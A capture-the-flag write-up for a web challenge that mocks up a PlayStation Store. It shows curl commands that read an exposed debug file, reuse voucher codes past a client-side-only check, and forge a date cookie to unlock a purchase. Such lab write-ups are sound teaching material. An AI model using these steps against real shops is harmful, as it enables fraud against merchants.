# PlayStation.Store

**Competition:** ITSCyberGame
**Category:** Web
**Connection:** `sfide.itscybergame.it:<port_number>`

---

## Description

> I want to play GTA 6!!!!! />:( If you can buy the game for me maybe I'll give you the flag (Note: the game is not included with the challenge)

A fake PlayStation Store with €10 in the wallet. GTA6 costs €89.99 and is shown as not yet available for purchase. Goal: buy the game.

---

## Solution

### 1. Recon — robots.txt

The HTML source contains a comment hinting at `robots.txt`:

```html
<!-- TODO remove robots.txt -->
```

Fetch `robots.txt`:

```bash
curl -s "http://sfide.itscybergame.it:<port_number>/robots.txt"
```

Example content:

```
User-agent: *
Disallow: /internal/

# legacy debug file - remove before production
# /internal/promo_state.txt
```

### 2. Exposed debug file

Retrieve the hinted file:

```bash
curl -s "http://sfide.itscybergame.it:<port_number>/internal/promo_state.txt"
```

```
window.__PROMO_STATE__ = {
  "WELCOME10": true,
  "PSPROMO23": true,
  "LAUNCH50": true
};
```

Three promo codes were exposed. Inspecting `assets/app.js` shows the "already redeemed" check is performed only client-side in JavaScript; the server does not validate it:

```javascript
function attemptRedeem(form){
  const code = input.value.trim().toUpperCase();
  if(isRedeemed(code)){     // client-only check
    alert("Voucher already redeemed");
    return false;
  }
  return true;
}
```

### 3. Bypass promo check — insufficient funds

Redeeming all three codes using curl (bypassing the JS check) increases the wallet to **€460.00**:

```bash
curl -s -c cookies.txt -X POST "http://sfide.itscybergame.it:<port_number>/redeem.php" -d "code=WELCOME10"
curl -s -b cookies.txt -c cookies.txt -X POST "http://sfide.itscybergame.it:<port_number>/redeem.php" -d "code=PSPROMO23"
curl -s -b cookies.txt -c cookies.txt -X POST "http://sfide.itscybergame.it:<port_number>/redeem.php" -d "code=LAUNCH50"
```

### 4. Bypass date check — product not available

Attempting to buy returns: `Transaction refused: product not yet available`. The game's release timestamp is `1798675200` (year 2027).

`app.js` reveals the server reads the `current_date` cookie to validate availability:

```javascript
let ct = getCookie("current_date");
// ...
const diff = releaseTs - clientNow;
if(diff <= 0){ /* unlock purchase */ }
```

The server trusts the cookie value without validation. Update the cookie in the jar with a timestamp past the release:

```bash
sed -i 's/current_date\t[0-9]*/current_date\t1798675201/' cookies.txt
```

### 5. Purchase

```bash
curl -s -b cookies.txt "http://sfide.itscybergame.it:<port_number>/buy.php?sku=gta6"
```

Response:

```
Purchase completed successfully.
flag{...}
```

---

## Flag

```
flag{...}
```

---

## Conclusions

This challenge combines three web vulnerabilities:

- Exposed sensitive files: `robots.txt` revealed `/internal/promo_state.txt` containing promo codes
- Client-side validation bypass: the "already redeemed" check was only in JS and can be bypassed with direct requests
- Time validation missing: the server used the client-provided `current_date` cookie to check availability instead of a server-side clock
